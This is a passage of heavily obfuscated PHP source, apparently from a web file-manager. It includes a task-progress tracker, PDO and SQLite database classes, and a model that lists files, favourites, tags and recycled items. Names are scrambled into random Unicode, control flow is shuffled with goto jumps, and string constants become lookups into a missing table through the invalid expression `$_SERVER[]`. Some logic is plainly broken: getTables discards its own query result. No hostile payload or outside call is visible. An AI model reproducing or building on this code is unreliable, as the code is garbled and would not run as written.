array($this, $F姝[1445])); Hook::bind($F姝[1446], array($this, $F姝[1447])); $this->startAfter(); goto d凌; d凌: Hook::trigger($F姝[1448], $this->task); $this->task[$F姝[1442]] = timeFloat(); goto Eǳ; D檐: $F姝 =& $_SERVER[]; if (self::get($F񸺷β)) { return; } $this->task = array($F姝[367] => $F񸺷β, $F姝[1437] => USER_ID, $F姝[1343] => $e, $F姝[29] => $a, $F姝[980] => $F姝[33], $F姝[978] => $e, $F姝[992] => 0, $F姝[1438] => 0, $F姝[1439] => 0, $F姝[1440] => timeFloat(), $F姝[1441] => 0, $F姝[1442] => 0, $F姝[1443] => 0, $F姝[1444] => 0, $F姝[688] => $F姝[1401]); goto F˔; Eǳ: } public function end() { goto Aү; fڋ: Hook::unbind($c[1446], array($this, $c[1447])); $this->endAfter(); $this->task = !1; goto D糠乣; Aү: $c =& $_SERVER[]; if (!$this->task) { return; } if ($this->task[$c[1442]]) { self::valueSet($this->task[$c[367]], !1); } goto e蜈; e蜈: $c絿 = timeFloat() - $this->task[$c[1440]]; self::log($c[1449] . $this->task[$c[367]] . $c[1450] . $c絿 . $c[1451]); Hook::unbind($c[1403], array($this, $c[1445])); goto fڋ; D糠乣: } public function update($eٷȅ = 0) { goto Fȅי; Fᑋ: $c = self::get($Aǘ[$EȽ[367]]); $bҵߔ = $c[$EȽ[688]]; if ($bҵߔ == self::STATYS_KILL) { $b = array($EȽ[1452] => LNG($EȽ[1453]), $EȽ[1034] => !1); Cache::set($EȽ[1454] . $this->task[$EȽ[367]], $b, 30); $this->end(); die; } else { if ($bҵߔ == self::STATYS_STOP) { $Dשƴť = 2; $c[$EȽ[1443]] += $Dשƴť; self::valueSet($Aǘ[$EȽ[367]], $c); sleep($Dשƴť); $this->update(); return; } } goto Dϳ; BЌ: Hook::trigger($EȽ[1455], $Aǘ); self::valueSet($Aǘ[$EȽ[367]], $Aǘ); goto b酈; F: $this->updateAfter(); $DՃ֔ = 0.2; if (timeFloat() - $Aǘ[$EȽ[1442]] < $DՃ֔) { return; } goto Fᑋ; Fȅי: $EȽ =& $_SERVER[]; $Aǘ =& $this->task; if (!$Aǘ) { return; } goto d췤; d췤: $Aǘ[$EȽ[992]] += $eٷȅ; $Aǘ[$EȽ[1441]] = timeFloat(); if ($Aǘ[$EȽ[978]]) { if ($Aǘ[$EȽ[978]] < $Aǘ[$EȽ[992]]) { $Aǘ[$EȽ[978]] = $Aǘ[$EȽ[992]]; } $f뼤 = timeFloat() - $Aǘ[$EȽ[1440]] - $Aǘ[$EȽ[1443]]; $Aǘ[$EȽ[1438]] = $Aǘ[$EȽ[992]] / $Aǘ[$EȽ[978]]; $Aǘ[$EȽ[1439]] = $Aǘ[$EȽ[992]] / $f뼤; if ($Aǘ[$EȽ[1438]] > 0) { $Aǘ[$EȽ[1444]] = $f뼤 * (1 - $Aǘ[$EȽ[1438]]) / $Aǘ[$EȽ[1438]]; } $Aǘ[$EȽ[1444]] = $Aǘ[$EȽ[1444]] <= 0 ? 0 : $Aǘ[$EȽ[1444]]; } goto F; Dϳ: $Aǘ[$EȽ[688]] = $bҵߔ ? $bҵߔ : $Aǘ[$EȽ[688]]; $Aǘ[$EȽ[1443]] = $c[$EȽ[1443]] ? $c[$EȽ[1443]] : 0; $Aǘ[$EȽ[1442]] = timeFloat(); goto BЌ; b酈: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Eɇ) { $CݼՒ =& $_SERVER[]; Cache::set($CݼՒ[1454] . $this->task[$CݼՒ[367]], $Eɇ, 60); return $Eɇ; } public static function get($EŃ) { return self::valueGet($EŃ); } public static function listData() { $C = self::valueGet(); return array_sort_by($C, $_SERVER[][1440], !0); } public static function kill($A) { return self::changeStatus($A, self::STATYS_KILL); } public static function stop($F) { return self::changeStatus($F, self::STATYS_STOP); } public static function restart($CϷƾ) { return self::changeStatus($CϷƾ, self::STATYS_RUNNING); } public static function killAll() { $d삤 =& $_SERVER[]; $Fۇ = self::listData(); foreach ($Fۇ as $Cň) { self::kill($Cň[$d삤[367]]); } sleep(2); foreach ($Fۇ as $Cň) { self::valueSet($Cň[$d삤[367]], !1); } } private static function changeStatus($c񕔠, $Cԏ) { goto a; FɍΡ: $aӒ[$Eڊ[688]] = $Cԏ; self::valueSet($c񕔠, $aӒ); self::log($Eڊ[1456] . $aӒ[$Eڊ[367]] . $Eڊ[1457] . $Cԏ); goto fڐ; a: $Eڊ =& $_SERVER[]; $aӒ = self::valueGet($c񕔠); if (!$aӒ) { return !1; } goto FɍΡ; fڐ: return !0; goto cΰ; cΰ: } public static function valueGet($FԊ = false) { $bے =& $_SERVER[]; if ($FԊ) { $B텦ܡ = Model($bے[399])->where(array($bے[89] => $FԊ, $bے[29] => $bے[1458]))->find(); return $B텦ܡ ? json_decode($B텦ܡ[$bے[359]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($dԡّ = false) { goto fǱ̤։; fǱ̤։: $bȵ =& $_SERVER[]; $CȖ = array($bȵ[29] => $bȵ[1458]); if ($dԡّ) { $CȖ[$bȵ[1437]] = $dԡّ; } goto E; E: $b = Model($bȵ[399])->where($CȖ)->select(); $b = $b ? $b : array(); foreach ($b as $d꜂ => $A쭈) { $b[$d꜂] = json_decode($A쭈[$bȵ[359]], !0); } goto bã; bã: return $b; goto bݦ; bݦ: } public static function valueSet($fӬ, $C) { goto Eㆄ⹂; aݢۮ: Model($e[399])->add($C򠉯, array(), !0); goto bԬ߷; cúџ젮: if (!$a) { ob_start(); var_dump($C); $a햽٤ = ob_get_clean(); self::log($e[1459] . json_encode_force($a햽٤)); } if (!$fӬ || !$C[$e[367]]) { return !1; } $C򠉯 = array($e[29] => $e[1458], $e[1437] => USER_ID, $e[89] => $fӬ, $e[359] => $a); goto aݢۮ; Eㆄ⹂: $e =& $_SERVER[]; if (!$C) { return Model($e[399])->where(array($e[89] => $fӬ, $e[29] => $e[1458]))->delete(); } $a = json_encode($C); goto cúџ젮; bԬ߷: } public static function log($d⯕) { write_log($d⯕, $_SERVER[][1460]); } } goto e̬; dő: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($FЙ = '') { $F϶Ѥ =& $_SERVER[]; if (!class_exists($F϶Ѥ[827])) { think_exception(think_lang($F϶Ѥ[10]) . $F϶Ѥ[828]); } if (!empty($FЙ)) { $this->config = $FЙ; if (empty($this->config[$F϶Ѥ[13]])) { $this->config[$F϶Ѥ[13]] = array(); } } } public function connect($DՄ = '', $EۡƋ = 0) { $b =& $_SERVER[]; if (!isset($this->linkID[$EۡƋ])) { goto f; f: if (empty($DՄ)) { $DՄ = $this->config; } if ($this->pconnect) { $DՄ[$b[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$EۡƋ] = new PDO($DՄ[$b[829]], $DՄ[$b[802]], $DՄ[$b[803]], $DՄ[$b[13]]); } catch (PDOException $cی) { think_exception($cی->getMessage()); } goto D; D: $this->dbType = $this->_getDsnType($DՄ[$b[829]]); if (in_array($this->dbType, array($b[830], $b[831], $b[832], $b[833]))) { think_exception($b[834] . $this->dbType . $b[835] . $this->dbType . $b[836]); } if (!$this->linkID[$EۡƋ]) { think_exception($b[837]); } goto B춢; B춢: $this->linkID[$EۡƋ]->exec($b[838] . think_config($b[805])); $this->connected = !0; if (1 != think_config($b[18])) { unset($this->config); } goto bݱ; bݱ: } return $this->linkID[$EۡƋ]; } public function free() { $this->PDOStatement = null; } public function query($Dל, $aÅ = array()) { goto C; Eһ: think_action_status($F̊[19], 1); think_status($F̊[20]); $this->PDOStatement = $this->_linkID->prepare($Dל); goto Bۼ; C: $F̊ =& $_SERVER[]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto e; E͓: if (!1 === $b) { $this->error(); return !1; } else { return $this->getAll(); } goto E; e: $this->queryStr = $Dל; if (!empty($aÅ)) { $this->queryStr .= $F̊[839] . print_r($aÅ, !0) . $F̊[840]; } if (!empty($this->PDOStatement)) { $this->free(); } goto Eһ; Bۼ: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $b = $this->PDOStatement->execute($aÅ); $this->debug(); goto E͓; E: } public function execute($DӴԪ, $A՚ = array()) { goto eɄ; a: $this->queryStr = $DӴԪ; if (!empty($A՚)) { $this->queryStr .= $Dؽ[839] . print_r($A՚, !0) . $Dؽ[840]; } $a = !1; goto e츸; e: think_status($Dؽ[20]); $this->PDOStatement = $this->_linkID->prepare($DӴԪ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto ȅյ; e츸: if ($this->dbType == $Dؽ[833]) { if (preg_match($Dؽ[841], $this->queryStr, $d⤊ˎ)) { $this->table = think_config($Dؽ[842]) . str_ireplace(think_config($Dؽ[843]), $Dؽ[361], $d⤊ˎ[2]); $a = (bool) $this->query($Dؽ[844] . strtoupper($this->table) . $Dؽ[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Dؽ[21], 1); goto e; ȅյ: $Dг = $this->PDOStatement->execute($A՚); $this->debug(); if (!1 === $Dг) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($a || preg_match($Dؽ[845], $DӴԪ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto EӚ; eɄ: $Dؽ =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto a; EӚ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $dڐ = $this->_linkID->commit(); $this->transTimes = 0; if (!$dڐ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $EȒ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$EȒ) { $this->error(); return !1; } } return !0; } private function getAll() { $A = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($A); return $A; } public function getFields($cʦ) { goto C; C: $B馐 =& $_SERVER[]; $this->initConnect(!0); if (think_config($B馐[846])) { $fՍ = str_replace($B馐[847], $cʦ, think_config($B馐[846])); } else { switch ($this->dbType) { case $B馐[830]: case $B馐[848]: $fՍ = "\123\x45\x4c\105\103\x54\x20\x20\40\x63\x6f\154\165\155\x6e\x5f\x6e\141\x6d\145\x20\141\x73\40\47\x4e\141\155\x65\47\54\x20\40\40\144\x61\164\x61\137\164\171\160\145\x20\141\x73\x20\x27\x54\171\x70\145\x27\54\x20\40\40\x63\x6f\154\x75\x6d\156\137\x64\x65\x66\141\165\154\x74\x20\141\x73\40\x27\104\145\146\x61\165\x6c\164\47\x2c\40\40\x20\x69\163\137\156\x75\x6c\x6c\141\x62\x6c\x65\40\x61\163\x20\47\x4e\165\x6c\x6c\x27\xa\x9\11\x46\122\117\x4d\x9\x69\156\146\157\162\155\141\x74\151\x6f\x6e\x5f\163\143\150\x65\x6d\x61\56\164\x61\142\x6c\x65\x73\40\101\123\x20\x74\xa\x9\11\112\x4f\x49\116\x9\x69\x6e\x66\157\162\155\x61\164\x69\x6f\x6e\137\163\x63\150\145\155\x61\56\143\x6f\x6c\x75\155\156\163\x20\x41\123\x20\143\xa\x9\x9\117\x4e\40\40\164\56\164\141\142\154\145\137\143\141\x74\141\x6c\157\x67\x20\x3d\40\x63\x2e\164\x61\142\154\145\x5f\143\141\164\141\154\x6f\x67\12\11\11\x41\x4e\x44\40\164\56\x74\x61\x62\x6c\145\x5f\x73\x63\150\145\x6d\x61\40\75\x20\143\56\x74\x61\x62\x6c\145\137\163\143\150\145\155\x61\xa\x9\11\x41\x4e\x44\x20\164\x2e\x74\141\x62\x6c\145\137\156\141\x6d\x65\40\x3d\x20\143\56\x74\141\142\x6c\x65\137\x6e\141\x6d\x65\xa\x9\11\x57\110\x45\122\105\40\40\x20\x74\x2e\x74\x61\142\x6c\145\x5f\156\141\155\145\40\75\40\x27{$cʦ}\x27"; break; case $B馐[849]: $fՍ = $B馐[850] . $cʦ . $B馐[851]; break; case $B馐[831]: case $B馐[833]: $fՍ = $B馐[852] . $B馐[853] . $B馐[854] . strtoupper($cʦ) . $B馐[855] . strtoupper($cʦ) . $B馐[856]; break; case $B馐[857]: $fՍ = $B馐[858] . $cʦ . $B馐[859]; break; case $B馐[832]: break; case $B馐[860]: default: $fՍ = $B馐[861] . ($this->dbType == $B馐[860] ? "\140{$cʦ}\140" : $cʦ); } } goto eÙ; eÙ: $B⶗ = $this->query($fՍ); $F = array(); if ($B⶗) { foreach ($B⶗ as $Eώ۪ => $c) { $c = array_change_key_case($c); $c[$B馐[28]] = isset($c[$B馐[28]]) ? $c[$B馐[28]] : $B馐[361]; $c[$B馐[29]] = isset($c[$B馐[29]]) ? $c[$B馐[29]] : $B馐[361]; $Fʡ藄 = isset($c[$B馐[261]]) ? $c[$B馐[261]] : $c[$B馐[28]]; $F[$Fʡ藄] = array($B馐[28] => $Fʡ藄, $B馐[29] => $c[$B馐[29]], $B馐[31] => (bool) (isset($c[$B馐[99]]) && $c[$B馐[99]] === $B馐[33] || isset($c[$B馐[31]]) && $c[$B馐[31]] === $B馐[33]), $B馐[34] => isset($c[$B馐[34]]) ? $c[$B馐[34]] : (isset($c[$B馐[53]]) ? $c[$B馐[53]] : $B馐[361]), $B馐[36] => isset($c[$B馐[89]]) ? strtolower($c[$B馐[89]]) == $B馐[38] : (isset($c[$B馐[54]]) ? $c[$B馐[54]] : !1), $B馐[39] => isset($c[$B馐[862]]) ? strtolower($c[$B馐[862]]) == $B馐[41] : (isset($c[$B馐[89]]) ? $c[$B馐[89]] : !1)); } } goto D; D: return $F; goto A; A: } public function getTables($f = '') { $Eۅ =& $_SERVER[]; if (think_config($Eۅ[863])) { $Fּݬ = str_replace($Eۅ[864], $f, think_config($Eۅ[863])); } else { switch ($this->dbType) { case $Eۅ[831]: case $Eۅ[833]: $Fּݬ = $Eۅ[865]; break; case $Eۅ[830]: case $Eۅ[848]: $Fּݬ = $Eۅ[866]; break; case $Eۅ[857]: $Fּݬ = $Eۅ[867]; break; case $Eۅ[832]: think_exception(think_lang($Eۅ[868]) . $Eۅ[869]); break; case $Eۅ[849]: $Fּݬ = $Eۅ[42] . $Eۅ[43] . $Eۅ[44]; break; case $Eۅ[860]: default: if (!empty($f)) { $Fּݬ = $Eۅ[813] . $f; } else { $Fּݬ = $Eۅ[814]; } } } $F = $this->query($Fּݬ); $F = array(); foreach ($F as $aǧ => $Eď) { $F[$aǧ] = current($Eď); } return $F; } protected function parseLimit($D٤) { $Fܪ =& $_SERVER[]; $C = $Fܪ[33]; if (!empty($D٤)) { switch ($this->dbType) { case $Fܪ[857]: case $Fܪ[849]: $D٤ = explode($Fܪ[47], $D٤); if (count($D٤) > 1) { $C .= $Fܪ[48] . $D٤[1] . $Fܪ[49] . $D٤[0] . $Fܪ[50]; } else { $C .= $Fܪ[48] . $D٤[0] . $Fܪ[50]; } break; case $Fܪ[830]: case $Fܪ[848]: break; case $Fܪ[832]: break; case $Fܪ[831]: case $Fܪ[833]: break; case $Fܪ[860]: default: $C .= $Fܪ[48] . $D٤ . $Fܪ[50]; } } return $C; } public function parseKey(&$a, $F = true) { $C =& $_SERVER[]; if ($F) { $a = $this->parseKeyCheck($a); } if ($this->dbType == $C[860]) { if ($a != $C[176] && !preg_match($C[824], $a)) { $a = $C[825] . trim($a, $C[825]) . $C[825]; } return $a; } else { return parent::parseKey($a); } } public function close() { $this->_linkID = null; } public function error() { $Bﵢґ =& $_SERVER[]; if ($this->PDOStatement) { $dޠ = $this->PDOStatement->errorInfo(); $this->error = $dޠ[1] . $Bﵢґ[4] . $dޠ[2]; } else { $this->error = $Bﵢґ[33]; } if ($Bﵢґ[33] != $this->queryStr) { $this->error .= LNG($Bﵢґ[45]) . $this->queryStr; } think_trace($this->error, $Bﵢґ[33], $Bﵢґ[46]); return $this->error; } public function escapeString($a) { $cώ =& $_SERVER[]; switch ($this->dbType) { case $cώ[857]: case $cώ[830]: case $cώ[848]: case $cώ[860]: return addslashes($a); case $cώ[832]: case $cώ[849]: case $cώ[831]: case $cώ[833]: return str_ireplace($cώ[55], $cώ[56], $a); } } protected function parseValue($bڿ) { $dˋ =& $_SERVER[]; if (is_string($bڿ)) { $bڿ = strpos($bڿ, $dˋ[4]) === 0 ? $this->escapeString($bڿ) : $dˋ[870] . $this->escapeString($bڿ) . $dˋ[870]; } elseif (isset($bڿ[0]) && is_string($bڿ[0]) && strtolower($bڿ[0]) == $dˋ[285]) { $bڿ = $this->escapeString($bڿ[1]); } elseif (is_array($bڿ)) { $bڿ = array_map(array($this, $dˋ[871]), $bڿ); } elseif (is_bool($bڿ)) { $bڿ = $bڿ ? $dˋ[83] : $dˋ[470]; } elseif (is_null($bڿ)) { $bڿ = $dˋ[99]; } return $bڿ; } public function getLastInsertId() { $D =& $_SERVER[]; switch ($this->dbType) { case $D[857]: case $D[849]: case $D[830]: case $D[848]: case $D[832]: case $D[860]: return $this->_linkID->lastInsertId(); case $D[831]: case $D[833]: $dƑ = $this->table; $cݎ = $this->query("\123\105\x4c\105\x43\124\40{$dƑ}\x2e\143\x75\x72\162\166\141\x6c\40\x63\165\x72\162\x76\141\154\x20\106\122\x4f\115\40\x64\x75\x61\x6c"); return $cݎ ? $cݎ[0][$D[872]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($f̕) { goto f; A: if (!$E) { return !1; } if (flock($E, LOCK_EX)) { $C҈ = parent::query($f̕); flock($E, LOCK_UN); fclose($E); return $C҈; } flock($E, LOCK_UN); goto d滋; f: $fƠ߼ =& $_SERVER[]; $dț = DATA_PATH . $fƠ߼[873]; $E = fopen($dț, $fƠ߼[874]); goto A; d滋: fclose($E); show_json($fƠ߼[875], !1); return !1; goto Aٚ; Aٚ: } public function execute($e) { goto B˱ē; b: if (!$FĈ) { return !1; } if (flock($FĈ, LOCK_EX)) { $cڴ = parent::execute($e); flock($FĈ, LOCK_UN); fclose($FĈ); return $cڴ; } flock($FĈ, LOCK_UN); goto A; B˱ē: $b =& $_SERVER[]; $eԈڦ = DATA_PATH . $b[873]; $FĈ = fopen($eԈڦ, $b[874]); goto b; A: fclose($FĈ); show_json($b[875], !1); return !1; goto Dޑ; Dޑ: } } class DbSqlite3 extends DbSqlite3Base { public function query($d٪) { goto F⿗; F⿗: $d =& $_SERVER[]; $a = DATA_PATH . $d[873]; $f沙 = fopen($a, $d[874]); goto fͮ; fͮ: if (!$f沙) { return !1; } if (flock($f沙, LOCK_EX)) { $Aኅȕ = parent::query($d٪); flock($f沙, LOCK_UN); fclose($f沙); return $Aኅȕ; } flock($f沙, LOCK_UN); goto Bƅǲߠ; Bƅǲߠ: fclose($f沙); show_json($d[875], !1); return !1; goto d; d: } public function execute($Aʼ) { goto bՖ; bՖ: $a˂ =& $_SERVER[]; $D§ = DATA_PATH . $a˂[873]; $eԣ = fopen($D§, $a˂[874]); goto aݙ; aݙ: if (!$eԣ) { return !1; } if (flock($eԣ, LOCK_EX)) { $e鬱͝ = parent::execute($Aʼ); flock($eԣ, LOCK_UN); fclose($eԣ); return $e鬱͝; } flock($eԣ, LOCK_UN); goto f׈; f׈: fclose($eԣ); show_json($a˂[875], !1); return !1; goto dȈ; dȈ: } } goto D; E: class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\157\x75\x72\x63\145"; protected $tableMeta = array("\164\x61\142\154\x65\x4e\x61\155\x65" => "\151\157\x5f\x73\157\165\x72\143\x65\x5f\155\145\164\141", "\x6d\x65\x74\141\106\x69\145\x6c\144" => "\163\157\x75\x72\x63\145\111\x44"); protected $dataAuto = array(array("\155\x6f\x64\x69\x66\171\124\x69\155\x65", "\164\x69\155\x65", "\151\156\x73\145\x72\x74", "\146\165\x6e\x63\x74\151\x6f\x6e"), array("\143\162\145\x61\x74\x65\x54\151\x6d\145", "\x74\x69\155\145", "\x69\x6e\x73\145\x72\x74", "\x66\165\x6e\x63\x74\151\157\x6e"), array("\166\x69\145\167\x54\x69\155\x65", "\x74\151\155\145", "\151\156\x73\x65\162\x74", "\x66\x75\156\x63\164\151\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($Dȹ) { return $this->listSource(array($_SERVER[][368] => $Dȹ)); } public function typeName($A) { static $AȻ = array(self::TYPE_SYSTEM => "\x73\171\163\x74\145\155", self::TYPE_USER => "\x75\x73\145\x72", self::TYPE_GROUP => "\x67\x72\157\165\x70"); return $AȻ[$A . $_SERVER[][33]]; } public function sourceListInfo($FώÇ, $Bُ = false) { goto AʋǑ; AʋǑ: $cղ挠 =& $_SERVER[]; $FώÇ = $FώÇ ? $FώÇ : array(); $FώÇ = array_filter(array_unique($FώÇ)); goto C; D̈: return array_to_keyvalue($C᎜, $cղ挠[369]); goto fׄ; C: if (!$FώÇ) { return array(); } $C᎜ = $this->where(array($cղ挠[369] => array($cղ挠[7], $FώÇ)))->select(); $this->_listDataApply($C᎜, $Bُ); goto D̈; fׄ: } public function pathInfoFilter($e칫) { goto a݄; E: if (isset($e칫[$E[376]]) && $e칫[$E[376]][$E[377]] == -1) { $B = array_remove_value($B, $E[187]); $B = array_remove_value($B, $E[107]); $B = array_remove_value($B, $E[378]); $B = array_remove_value($B, $E[379]); $B = array_remove_value($B, $E[77]); $B = array_remove_value($B, $E[380]); } $e칫 = array_field_key($e칫, $B); return $e칫; goto f񫕓; a݄: $E =& $_SERVER[]; $e칫[$E[75]] = KodIO::make($e칫[$E[369]]); $e칫[$E[29]] = $e칫[$E[370]] == 1 ? $E[76] : $E[167]; goto AŐ֗; AŐ֗: $e칫[$E[371]] = $this->typeName($e칫[$E[371]]); if ($e칫[$E[370]] != 1) { $e칫[$E[160]] = $e칫[$E[372]]; unset($e칫[$E[372]]); } $bᤪ = $E[373]; goto F݈ł; F݈ł: $bᤪ .= $E[374]; $bᤪ .= $E[375]; $B = explode($E[47], $bᤪ); goto E; f񫕓: } public function listUserFav() { goto f; dߺ: $e = array_to_keyvalue($e, $C[33], $C[75]); if ($e) { $eӽ = $this->listSource(array($C[383] => array($C[384], $e))); } $eӽ = array_to_keyvalue($eӽ[$C[354]], $C[369]); goto A; A: foreach ($f쉷 as &$F胂̂) { $F胂̂ = array($C[385] => $F胂̂[$C[367]], $C[386] => $F胂̂[$C[28]], $C[387] => $F胂̂[$C[75]], $C[388] => $F胂̂[$C[29]], $C[389] => $F胂̂[$C[187]], $C[390] => $F胂̂[$C[107]]); if ($F胂̂[$C[29]] == $C[382] && $eӽ[$F胂̂[$C[75]]]) { $F胂̂[$C[391]] = $eӽ[$F胂̂[$C[75]]]; } } return $f쉷; goto b; f: $C =& $_SERVER[]; $f쉷 = Model($C[381])->listData(); $e = array_filter_by_field($f쉷, $C[29], $C[382]); goto dߺ; b: } public function listUserTag($D) { goto FŮϛ; B̭: $Fޛ = array(); foreach ($cƐ as $a􉣒ũ) { $E᧣ = $a􉣒ũ[$Dվ[75]]; if (!$E᧣) { continue; } if (!isset($Fޛ[$E᧣])) { $Fޛ[$E᧣] = array(); } $Fޛ[$E᧣][] = $a􉣒ũ[$Dվ[393]]; } $e = array(); goto E仧; E仧: foreach ($Fޛ as $BÅ׊ => $a) { $bÞ = !0; if (!$D) { $e[] = $BÅ׊; continue; } foreach ($D as $a) { if (!in_array($a, $a)) { $bÞ = !1; break; } } if ($bÞ) { $e[] = $BÅ׊; } } if (!$e) { return array(); } $F = $this->listSource(array($Dվ[383] => array($Dվ[384], $e))); goto Aݎ; FŮϛ: $Dվ =& $_SERVER[]; if ($D && !is_array($D)) { $D = array($D); } $cƐ = Model($Dվ[392])->listData(); goto B̭; Aݎ: if (!$F || count($e) == $F[$Dվ[351]][$Dվ[352]]) { return $F; } $fү = array(); $B = array_to_keyvalue($F[$Dվ[74]], $Dվ[33], $Dվ[369]); goto F奉; e: if ($fү) { Model($Dվ[394])->removeBySource($fү); } return $F; goto fꜺ; F奉: $bԅ = array_to_keyvalue($F[$Dվ[73]], $Dվ[33], $Dվ[369]); $AƓ = array_merge($bԅ, $B); foreach ($e as $E᧣) { if (!in_array($E᧣, $AƓ)) { $fү[] = $E᧣; } } goto e; fꜺ: } public function listUserRecycle() { $Dη =& $_SERVER[]; $Cӄ = Model($Dη[395])->listData(); if (!$Cӄ) { return array(); } $B౐ = array($Dη[383] => array($Dη[384], $Cӄ), $Dη[396] => 1); return $this->listSource($B౐); } public function listSource($Dٱ, $fĜ = 3000) { goto Aݼ; Aݼ: $A胈 =& $_SERVER[]; if (!isset($Dٱ[$A胈[397]])) { $Dٱ[$A胈[397]] = 0; } $CˌЧ = $A胈[398]; goto f՞; f՞: $D΄ = $this->field($CˌЧ)->_makeOrder()->where($Dٱ)->selectPage($fĜ); $this->_listDataApply($D΄[$A胈[354]]); $this->_listMake($D΄); goto b۷; b۷: return $D΄; goto Aއԓ; Aއԓ: } protected function _makeOrder() { goto B͔ҿ; A܊: $aꡗ = Input::get($b̚ŝތ[408], $b̚ŝތ[7], $cƩ, array_keys($E)); if (!in_array($F˙Ԃ, array_keys($d))) { $F˙Ԃ = $b̚ŝތ[28]; } if (!in_array($aꡗ, array_keys($E))) { $F˙Ԃ = $b̚ŝތ[402]; } goto d왂; c풌: $E = array($b̚ŝތ[402] => $b̚ŝތ[403], $b̚ŝތ[404] => $b̚ŝތ[405]); $d = array($b̚ŝތ[28] => $b̚ŝތ[28], $b̚ŝތ[77] => $b̚ŝތ[77], $b̚ŝތ[160] => $b̚ŝތ[372], $b̚ŝތ[378] => $b̚ŝތ[378], $b̚ŝތ[406] => $b̚ŝތ[379], $b̚ŝތ[187] => $b̚ŝތ[187], $b̚ŝތ[107] => $b̚ŝތ[107]); $F˙Ԃ = Input::get($b̚ŝތ[407], $b̚ŝތ[7], $bԵ, array_keys($d)); goto A܊; B͔ҿ: $b̚ŝތ =& $_SERVER[]; $bԵ = Model($b̚ŝތ[399])->get($b̚ŝތ[400]); $cƩ = Model($b̚ŝތ[399])->get($b̚ŝތ[401]); goto c풌; d왂: if ($F˙Ԃ == $b̚ŝތ[28]) { } $dԃ = $b̚ŝތ[409] . $d[$F˙Ԃ] . $b̚ŝތ[50] . $E[$aꡗ]; return $this->order(rtrim(trim($dԃ), $b̚ŝތ[47])); goto e; e: } protected function _listDataApplyItem($Fֳ, $F = false) { $A¨ = array($Fֳ); $this->_listDataApply($A¨, $F); return $A¨[0]; } protected function _listDataApply(&$D햶, $B̐۫ = false) { goto a숲; AܶȪ: $f = array_unique($f); $this->_listSourceCache($D햶); if (!$B̐۫) { $this->_listAppendMeta($D햶, $f); $this->_listAppendFileMeta($D햶, $f); $this->_listAppendChildren($D햶, $f); } goto Cםԇ; a: $this->_listAppendUser($D햶); $this->_listFilterInfo($D햶, $B̐۫); goto E; a숲: $F֜ =& $_SERVER[]; if (!$D햶) { $D햶 = array(); return; } $f = array_to_keyvalue($D햶, $F֜[33], $F֜[369]); goto AܶȪ; Cםԇ: $this->_listAppendPath($D햶); $this->_listAppendAuth($D햶); $this->_listAppendSourceInfo($D햶, $f); goto a; E: } protected function _listSourceCache($fۘʡ) { $cԸ =& $_SERVER[]; foreach ($fۘʡ as $bޑ̴Ԑ) { self::$cacheSourceInfo[$cԸ[410] . $bޑ̴Ԑ[$cԸ[369]]] = $bޑ̴Ԑ; } } protected function _listFilterInfo(&$Eܻ, $e = false) { $Fș =& $_SERVER[]; foreach ($Eܻ as &$b) { $b = $this->pathInfoFilter($b); self::$cachePathInfo[$Fș[411] . intval($e) . $Fș[412] . $b[$Fș[369]]] = $b; } } protected function _listMake(&$dݦ) { $d®ĚӃ =& $_SERVER[]; $dݦ[$d®ĚӃ[74]] = array(); $dݦ[$d®ĚӃ[73]] = array(); foreach ($dݦ[$d®ĚӃ[354]] as $aΊ) { $e = $aΊ[$d®ĚӃ[370]] == 1 ? $d®ĚӃ[74] : $d®ĚӃ[73]; $dݦ[$e][] = $aΊ; } unset($dݦ[$d®ĚӃ[354]]); } protected function _listAppendMeta(&$b݄, $c԰) { goto Cļ; cӾƙ: if (!$d㎍ʓ) { return; } $Aˮ = array($eׅ[415], $eׅ[416]); $dӋ = array(); goto E; E: foreach ($d㎍ʓ as $c順؎) { if (!isset($dӋ[$c順؎[$eׅ[369]]])) { $dӋ[$c順؎[$eׅ[369]]] = array(); } if (in_array($c順؎[$eׅ[89]], $Aˮ)) { continue; } $dӋ[$c順؎[$eׅ[369]]][$c順؎[$eׅ[89]]] = $c順؎[$eׅ[359]]; } foreach ($b݄ as &$f) { $f[$eׅ[417]] = !1; if (isset($dӋ[$f[$eׅ[369]]])) { $f[$eׅ[417]] = $dӋ[$f[$eׅ[369]]]; } if ($this->fileIsLock($f) && $f[$eׅ[376]]) { $bšی = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $f[$eׅ[376]][$eׅ[377]] = AuthModel::authDisable($f[$eׅ[376]][$eׅ[377]], $bšی); $f[$eׅ[376]][$eׅ[418]][$eׅ[376]] = $f[$eׅ[376]][$eׅ[377]]; } } goto aΐ; Cļ: $eׅ =& $_SERVER[]; $Dͧ = array($eׅ[383] => array($eׅ[384], $c԰)); $d㎍ʓ = Model($eׅ[413])->field($eׅ[414])->where($Dͧ)->select(); goto cӾƙ; aΐ: } protected function _listAppendFileMeta(&$B򐼠, $dή) { goto D߽; e٨: if (!$Dť) { return; } $B = array($A׿[420] => array($A׿[384], $Dť)); $dǊ٭ = $A׿[421]; goto d; d: $BӺܟ = Model($A׿[422])->field($dǊ٭)->where($B)->select(); $BӺܟ = array_to_keyvalue($BӺܟ, $A׿[419]); 